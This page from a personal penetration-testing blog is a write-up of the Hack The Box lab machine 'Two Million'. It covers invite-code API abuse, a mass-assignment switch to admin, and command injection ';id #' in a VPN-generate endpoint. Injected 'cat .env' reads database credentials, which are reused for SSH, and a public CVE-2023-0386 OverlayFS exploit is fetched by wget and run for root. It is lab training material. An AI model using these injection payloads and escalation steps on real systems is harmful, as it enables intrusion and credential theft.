<!doctype html>
<html lang="en" dir="ltr" class="blog-wrapper blog-post-page plugin-blog plugin-id-default" data-has-hydrated="false">
<head>
<meta charset="UTF-8">
<meta name="generator" content="Docusaurus v3.7.0">
<title data-rh="true">Two Million | Penetration Testing Journal</title><meta data-rh="true" name="viewport" content="width=device-width,initial-scale=1"><meta data-rh="true" name="twitter:card" content="summary_large_image"><meta data-rh="true" property="og:url" content="https://danae-pan.github.io/Blog/blog/TwoMillion"><meta data-rh="true" property="og:locale" content="en"><meta data-rh="true" name="docusaurus_locale" content="en"><meta data-rh="true" name="docusaurus_tag" content="default"><meta data-rh="true" name="docsearch:language" content="en"><meta data-rh="true" name="docsearch:docusaurus_tag" content="default"><meta data-rh="true" property="og:title" content="Two Million | Penetration Testing Journal"><meta data-rh="true" name="description" content="Task 1"><meta data-rh="true" property="og:description" content="Task 1"><meta data-rh="true" property="og:type" content="article"><meta data-rh="true" property="article:published_time" content="2025-08-02T00:00:00.000Z"><meta data-rh="true" property="article:tag" content="easy,linux"><link data-rh="true" rel="canonical" href="https://danae-pan.github.io/Blog/blog/TwoMillion"><link data-rh="true" rel="alternate" href="https://danae-pan.github.io/Blog/blog/TwoMillion" hreflang="en"><link data-rh="true" rel="alternate" href="https://danae-pan.github.io/Blog/blog/TwoMillion" hreflang="x-default"><script data-rh="true" type="application/ld+json">{"@context":"https://schema.org","@type":"BlogPosting","@id":"https://danae-pan.github.io/Blog/blog/TwoMillion","mainEntityOfPage":"https://danae-pan.github.io/Blog/blog/TwoMillion","url":"https://danae-pan.github.io/Blog/blog/TwoMillion","headline":"Two Million","name":"Two Million","description":"Task 1","datePublished":"2025-08-02T00:00:00.000Z","author":[],"keywords":[],"isPartOf":{"@type":"Blog","@id":"https://danae-pan.github.io/Blog/blog","name":"Intro to Red Team"}}</script><link rel="alternate" type="application/rss+xml" href="/Blog/blog/rss.xml" title="Penetration Testing Journal RSS Feed">
<link rel="alternate" type="application/atom+xml" href="/Blog/blog/atom.xml" title="Penetration Testing Journal Atom Feed"><link rel="stylesheet" href="/Blog/assets/css/styles.e69e0e8b.css">
<script src="/Blog/assets/js/runtime~main.19474d45.js" defer="defer"></script>
<script src="/Blog/assets/js/main.b0be2e9e.js" defer="defer"></script>
</head>
<body class="navigation-with-keyboard">
<script>!function(){function t(t){document.documentElement.setAttribute("data-theme",t)}var e=function(){try{return new URLSearchParams(window.location.search).get("docusaurus-theme")}catch(t){}}()||function(){try{return window.localStorage.getItem("theme")}catch(t){}}();t(null!==e?e:"dark")}(),function(){try{const n=new URLSearchParams(window.location.search).entries();for(var[t,e]of n)if(t.startsWith("docusaurus-data-")){var a=t.replace("docusaurus-data-","data-");document.documentElement.setAttribute(a,e)}}catch(t){}}()</script><div id="__docusaurus"><div role="region" aria-label="Skip to main content"><a class="skipToContent_fXgn" href="#__docusaurus_skipToContent_fallback">Skip to main content</a></div><nav aria-label="Main" class="navbar navbar--fixed-top"><div class="navbar__inner"><div class="navbar__items"><button aria-label="Toggle navigation bar" aria-expanded="false" class="navbar__toggle clean-btn" type="button"><svg width="30" height="30" viewBox="0 0 30 30" aria-hidden="true"><path stroke="currentColor" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2" d="M4 7h22M4 15h22M4 23h22"></path></svg></button><a class="navbar__brand" href="/Blog/"><b class="navbar__title text--truncate">About Me</b></a><a class="navbar__item navbar__link" href="/Blog/docs/phases/Introduction">Guides</a><a aria-current="page" class="navbar__item navbar__link navbar__link--active" href="/Blog/blog/">Write Ups</a></div><div class="navbar__items navbar__items--right"><a class="navbar__item navbar__link" href="/Blog/docs/stories/Brain: the first computer virus">Bedtime Stories</a><div class="navbarSearchContainer_Bca1"></div></div></div><div role="presentation" class="navbar-sidebar__backdrop"></div></nav><div id="__docusaurus_skipToContent_fallback" class="main-wrapper mainWrapper_z2l0"><div class="container margin-vert--lg"><div class="row"><aside class="col col--3"><nav class="sidebar_re4s thin-scrollbar" aria-label="Blog recent posts navigation"><div class="sidebarItemTitle_pO2u margin-bottom--md">Recent posts</div><div role="group"><h3 class="yearGroupHeading_rMGB">2025</h3><ul class="sidebarItemList_Yudw clean-list"><li class="sidebarItem__DBe"><a aria-current="page" class="sidebarItemLink_mo7H sidebarItemLinkActive_I1ZP" href="/Blog/blog/TwoMillion">Two Million</a></li><li class="sidebarItem__DBe"><a class="sidebarItemLink_mo7H" href="/Blog/blog/Cicada">Cicada</a></li><li class="sidebarItem__DBe"><a class="sidebarItemLink_mo7H" href="/Blog/blog/BoardLight">Board Light</a></li><li class="sidebarItem__DBe"><a class="sidebarItemLink_mo7H" href="/Blog/blog/Driver">Driver</a></li><li class="sidebarItem__DBe"><a class="sidebarItemLink_mo7H" href="/Blog/blog/Precious">Precious</a></li><li class="sidebarItem__DBe"><a class="sidebarItemLink_mo7H" href="/Blog/blog/Writeup">Writeup</a></li><li class="sidebarItem__DBe"><a class="sidebarItemLink_mo7H" href="/Blog/blog/Paper">Paper</a></li><li class="sidebarItem__DBe"><a class="sidebarItemLink_mo7H" href="/Blog/blog/Devvortex">Devvortex</a></li><li class="sidebarItem__DBe"><a class="sidebarItemLink_mo7H" href="/Blog/blog/GoodGames">Good Games</a></li><li class="sidebarItem__DBe"><a class="sidebarItemLink_mo7H" href="/Blog/blog/Sau">Sau</a></li><li class="sidebarItem__DBe"><a class="sidebarItemLink_mo7H" href="/Blog/blog/Jerry">Jerry</a></li><li class="sidebarItem__DBe"><a class="sidebarItemLink_mo7H" href="/Blog/blog/Cap">Cap</a></li></ul></div></nav></aside><main class="col col--7"><article class=""><header><h1 class="title_f1Hy">Two Million</h1><div class="container_mt6G margin-vert--md"><time datetime="2025-08-02T00:00:00.000Z">August 2, 2025</time> · <!-- -->6 min read</div></header><div id="__blog-post-container" class="markdown"><h3 class="anchor anchorWithStickyNavbar_LWe7" id="task-1">Task 1<a href="#task-1" class="hash-link" aria-label="Direct link to Task 1" title="Direct link to Task 1">​</a></h3>
<p>How many TCP ports are open?</p>
<p>Running <code>nmap -sS &lt;target_ip&gt;</code> we see two ports open on the target system.</p>
<p><img decoding="async" loading="lazy" alt="alt text" src="/Blog/assets/images/image-t-1-44a5e88fc5d4b4bf08a2d53f807be20a.png" width="801" height="203" class="img_ev3q"></p>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="task-2">Task 2<a href="#task-2" class="hash-link" aria-label="Direct link to Task 2" title="Direct link to Task 2">​</a></h3>
<p>What is the name of the JavaScript file loaded by the /invite page that has to do with invite codes?</p>
<p>Navigating to the target IP on the browser we see that the server is not found. After adding the target IP on the host file using the command <code>sudo vim /etc/hosts</code> with the domain name being <code>2million.htb</code> we can refresh the page and navigate to the /invite page. There, we see a sign-up/login form.</p>
<p><img decoding="async" loading="lazy" alt="alt text" src="/Blog/assets/images/image-t-2-a7054f9e4d1c11f2e9dfe305242ec1c7.png" width="590" height="318" class="img_ev3q"></p>
<p>Viewing the page source and searching for any Javascript file, we locate the following, having the name <code>inviteapi.min.js</code>:</p>
<p><img decoding="async" loading="lazy" alt="alt text" src="/Blog/assets/images/image-t-3-e8a46b7e6da7df0a7bcbf4aee440ccdc.png" width="922" height="530" class="img_ev3q"></p>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="task-3">Task 3<a href="#task-3" class="hash-link" aria-label="Direct link to Task 3" title="Direct link to Task 3">​</a></h3>
<p>What JavaScript function on the invite page returns the first hint about how to get an invite code? Don&#x27;t include () in the answer.</p>
<p>Opening the previous file, we locate the function <code>makeInviteCode</code> that is the Javascript function returning the first hint.</p>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="task-4">Task 4<a href="#task-4" class="hash-link" aria-label="Direct link to Task 4" title="Direct link to Task 4">​</a></h3>
<p>The endpoint in makeInviteCode returns encrypted data. That message provides another endpoint to query. That endpoint returns a code value that is encoded with what very common binary to text encoding format. What is the name of that encoding?</p>
<p>First, opening the console on the developer tools, we call the function by <code>makeInviteCode</code> and observe the result:</p>
<p><img decoding="async" loading="lazy" alt="alt text" src="/Blog/assets/images/image-t-4-8c05b368bb63181127adc02b441811e0.png" width="1001" height="399" class="img_ev3q"></p>
<p>We see that the data is encoded with ROT13, so we can decode the value of the field <code>data</code> using any ROT13 decoder and we get the message &quot;In order to generate the invite code, make a POST request to /api/v1/invite/generate&quot;. So, we can use <code>fetch</code> in the browser console to query this endpoint by:</p>
<div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#bfc7d5;--prism-background-color:#292d3e"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#bfc7d5;background-color:#292d3e"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#bfc7d5"><span class="token plain">fetch(&#x27;/api/v1/invite/generate&#x27;, {</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">  method: &#x27;POST&#x27;,</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">  headers: { &#x27;Content-Type&#x27;: &#x27;application/json&#x27; }</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">})</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">  .then(res =&gt; res.json())</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">  .then(data =&gt; console.log(data));</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>As a response, we see the code that is encoded using Base64.</p>
<p><img decoding="async" loading="lazy" alt="alt text" src="/Blog/assets/images/image-t-5-f120ebc9d3aa6a80628771bdffd19f93.png" width="542" height="74" class="img_ev3q"></p>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="task-5">Task 5<a href="#task-5" class="hash-link" aria-label="Direct link to Task 5" title="Direct link to Task 5">​</a></h3>
<p>What is the path to the endpoint the page uses when a user clicks on &quot;Connection Pack&quot;?</p>
<p>First, we decode the code from the previous task and use it to sign up and register for an account. We then login and look for the &quot;Connection Pack&quot;. We find it under the &quot;Access&quot; page, we open the tools on the Network tab and clicking the button. On the Headers tab of the request we see the API endpoint where the GET function sends the request.</p>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="task-6">Task 6<a href="#task-6" class="hash-link" aria-label="Direct link to Task 6" title="Direct link to Task 6">​</a></h3>
<p>How many API endpoints are there under /api/v1/admin?</p>
<p>By navigating to the endpoint <code>/api/v1</code> we can see a list of endpoints including admin.</p>
<p><img decoding="async" loading="lazy" alt="alt text" src="/Blog/assets/images/image-t-6-58a64bab300755410abbd3eb3d884a70.png" width="569" height="429" class="img_ev3q"></p>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="task-7">Task 7<a href="#task-7" class="hash-link" aria-label="Direct link to Task 7" title="Direct link to Task 7">​</a></h3>
<p>What API endpoint can change a user account to an admin account?</p>
<p>Inspecting the result from the previous task we see that he desired endpoint is <code>/api/v1/admin/settings/update</code>.</p>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="task-8">Task 8<a href="#task-8" class="hash-link" aria-label="Direct link to Task 8" title="Direct link to Task 8">​</a></h3>
<p>What API endpoint has a command injection vulnerability in it?</p>
<p>We can try to send a PUT request to the endpoint from the previous task using Repeater. We need to also adjust the content type to be Content-Type: application/json on the request. From the response we see that there is a missing parameter for the email field.</p>
<p><img decoding="async" loading="lazy" alt="alt text" src="/Blog/assets/images/image-t-8-80438640b17331e3c9579032101f78c2.png" width="458" height="315" class="img_ev3q"></p>
<p>Adding the parameter email on the body of the request and repeating we see that there is also the is_admin parameter missing. We can try adding this as well with the value being true to see whether we are able to change the privileges for the registered user. Sending this request we get a status code of 200 meaning a successful request.</p>
<p><img decoding="async" loading="lazy" alt="alt text" src="/Blog/assets/images/image-t-9-4be6b81e194a2fe40e9d7190ac47a4b9.png" width="631" height="418" class="img_ev3q"></p>
<p>We can also use the endpoint <code>/api/v1/admin/auth</code> to check if the user is admin which returns a positive response. Since we are now an admin user, we can also try the last API endpoint with the method POST <code>/api/v1/admin/vpn/generate</code>. For this request to succeed, we need also to add the Content-Type to be application/json as before as well as the username with its value as body parameter. To see if this is the endpoint that has the command injection vulnerability, we can try injecting <code>;id #</code> after the value of the username field on the body.</p>
<p><img decoding="async" loading="lazy" alt="alt text" src="/Blog/assets/images/image-t-10-3bc452f38b49ac62d0e88a7850ab2fbd.png" width="631" height="404" class="img_ev3q"></p>
<p>The request goes through giving us a 200 OK status code and returning back the user&#x27;s identity information which means the command injection is successful.</p>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="task-9">Task 9<a href="#task-9" class="hash-link" aria-label="Direct link to Task 9" title="Direct link to Task 9">​</a></h3>
<p>What file is commonly used in PHP applications to store environment variable values?</p>
<p>Further using the command injection, we can try listing the contents of the diretory by changing the <code>id</code> command to <code>ls</code>. On the response, we see a list of files and folders.</p>
<p><img decoding="async" loading="lazy" alt="alt text" src="/Blog/assets/images/image-t-11-3fecff40a6fe711a3c41c85287a398b4.png" width="631" height="443" class="img_ev3q"></p>
<p>From those, we can use <code>cat index.php</code> command and see the contents of this file in the response.</p>
<p><img decoding="async" loading="lazy" alt="alt text" src="/Blog/assets/images/image-t-12-d90868d3521bf23af1a0582bf59b7657.png" width="583" height="342" class="img_ev3q"></p>
<p>From the response it seems that those values are being read from a <code>.env</code> file. Seeing the contents of the file with the command <code>cat .env</code> we get the environmental variables for the database as a response.</p>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="task-10">Task 10<a href="#task-10" class="hash-link" aria-label="Direct link to Task 10" title="Direct link to Task 10">​</a></h3>
<p>Submit the flag located in the admin user&#x27;s home directory.</p>
<p>Using the admin&#x27;s credentials found previously, we can now directly ssh to the server to obtain the flag by <code>ssh admin@2million.htb</code> and providing the admin&#x27;s password. Then, finding the flag is just as easy as running <code>cat user.txt</code>.</p>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="task-11">Task 11<a href="#task-11" class="hash-link" aria-label="Direct link to Task 11" title="Direct link to Task 11">​</a></h3>
<p>What is the email address of the sender of the email sent to admin?</p>
<p>In linux, local emails are usually stored in <code>/var/mail</code> directory. Navigating there and opening the file with the name &quot;admin&quot; we find the sender.</p>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="task-12">Task 12<a href="#task-12" class="hash-link" aria-label="Direct link to Task 12" title="Direct link to Task 12">​</a></h3>
<p>What is the 2023 CVE ID for a vulnerability in that allows an attacker to move files in the Overlay file system while maintaining metadata like the owner and SetUID bits?</p>
<p>Looking up for vulnerabilities of the Overlay file system in the <a href="https://www.cve.org/" target="_blank" rel="noopener noreferrer">CVE database</a>, we find the CVE ID.</p>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="task-13">Task 13<a href="#task-13" class="hash-link" aria-label="Direct link to Task 13" title="Direct link to Task 13">​</a></h3>
<p>Submit the flag located in root&#x27;s home directory.</p>
<p>Looking up for a public exploit for this vulnerability we come up with a <a href="https://github.com/sxlmnwb/CVE-2023-0386" target="_blank" rel="noopener noreferrer">github repository</a>. In order to use this exploit on the target machine where we gained the admin privilege, we have first to clone it on the host machine and then open a connection by spanning a python server on the directory where the repository file is. Before attempting transfer, we need to compress the entire foler into a single file using the command <code>tar czf CVE-2023-0386.tar.gz CVE-2023-0386/</code>. Running <code>python3 -m http.server 8080</code> opens a connection on port 8080 so we can now communicate from the target server to transfer the file using the command <code>wget http://&lt;host_ip&gt;:8080/CVE-2023-038.tar.gz</code>. Then, after extracting the archive by <code>tar xzf CVE-2023-0386.tar.gz</code> we can use the repository&#x27;s README as guide to compile by running <code>make</code>. On the same terminal we then run <code>./fuse ./ovlcap/lower ./gc</code> and om a second terminal <code>./exp</code>. We now have root access and we can navigate to root&#x27;s directory, run <code>cat root.txt</code> and get the flag.</p></div><footer class="docusaurus-mt-lg"><div class="row margin-top--sm theme-blog-footer-edit-meta-row"><div class="col"><b>Tags:</b><ul class="tags_jXut padding--none margin-left--sm"><li class="tag_QGVx"><a class="tag_zVej tagRegular_sFm0" href="/Blog/blog/tags/easy">easy</a></li><li class="tag_QGVx"><a class="tag_zVej tagRegular_sFm0" href="/Blog/blog/tags/linux">linux</a></li></ul></div></div><div class="row margin-top--sm theme-blog-footer-edit-meta-row"><div class="col"><a href="https://github.com/danae-pan/Blog/blog/TwoMillion.md" target="_blank" rel="noopener noreferrer" class="theme-edit-this-page"><svg fill="currentColor" height="20" width="20" viewBox="0 0 40 40" class="iconEdit_Z9Sw" aria-hidden="true"><g><path d="m34.5 11.7l-3 3.1-6.3-6.3 3.1-3q0.5-0.5 1.2-0.5t1.1 0.5l3.9 3.9q0.5 0.4 0.5 1.1t-0.5 1.2z m-29.5 17.1l18.4-18.5 6.3 6.3-18.4 18.4h-6.3v-6.2z"></path></g></svg>Edit this page</a></div><div class="col lastUpdated_JAkA"></div></div></footer></article><nav class="pagination-nav docusaurus-mt-lg" aria-label="Blog post page navigation"><a class="pagination-nav__link pagination-nav__link--next" href="/Blog/blog/Cicada"><div class="pagination-nav__sublabel">Older post</div><div class="pagination-nav__label">Cicada</div></a></nav></main><div class="col col--2"><div class="tableOfContents_bqdL thin-scrollbar"><ul class="table-of-contents table-of-contents__left-border"><li><a href="#task-1" class="table-of-contents__link toc-highlight">Task 1</a></li><li><a href="#task-2" class="table-of-contents__link toc-highlight">Task 2</a></li><li><a href="#task-3" class="table-of-contents__link toc-highlight">Task 3</a></li><li><a href="#task-4" class="table-of-contents__link toc-highlight">Task 4</a></li><li><a href="#task-5" class="table-of-contents__link toc-highlight">Task 5</a></li><li><a href="#task-6" class="table-of-contents__link toc-highlight">Task 6</a></li><li><a href="#task-7" class="table-of-contents__link toc-highlight">Task 7</a></li><li><a href="#task-8" class="table-of-contents__link toc-highlight">Task 8</a></li><li><a href="#task-9" class="table-of-contents__link toc-highlight">Task 9</a></li><li><a href="#task-10" class="table-of-contents__link toc-highlight">Task 10</a></li><li><a href="#task-11" class="table-of-contents__link toc-highlight">Task 11</a></li><li><a href="#task-12" class="table-of-contents__link toc-highlight">Task 12</a></li><li><a href="#task-13" class="table-of-contents__link toc-highlight">Task 13</a></li></ul></div></div></div></div></div><footer class="footer footer--dark"><div class="container container-fluid"><div class="row footer__links"><div class="col footer__col"><div class="footer__title">Contact</div><ul class="footer__items clean-list"><li class="footer__item"><a href="https://github.com/danae-pan" target="_blank" rel="noopener noreferrer" class="footer__link-item">GitHub<svg width="13.5" height="13.5" aria-hidden="true" viewBox="0 0 24 24" class="iconExternalLink_nPIU"><path fill="currentColor" d="M21 13v10h-21v-19h12v2h-10v15h17v-8h2zm3-12h-10.988l4.035 4-6.977 7.07 2.828 2.828 6.977-7.07 4.125 4.172v-11z"></path></svg></a></li><li class="footer__item"><a href="https://linkedin.com/in/anastasia-danai-panagiotopoulou" target="_blank" rel="noopener noreferrer" class="footer__link-item">LinkedIn<svg width="13.5" height="13.5" aria-hidden="true" viewBox="0 0 24 24" class="iconExternalLink_nPIU"><path fill="currentColor" d="M21 13v10h-21v-19h12v2h-10v15h17v-8h2zm3-12h-10.988l4.035 4-6.977 7.07 2.828 2.828 6.977-7.07 4.125 4.172v-11z"></path></svg></a></li></ul></div></div></div></footer></div>
</body>
</html>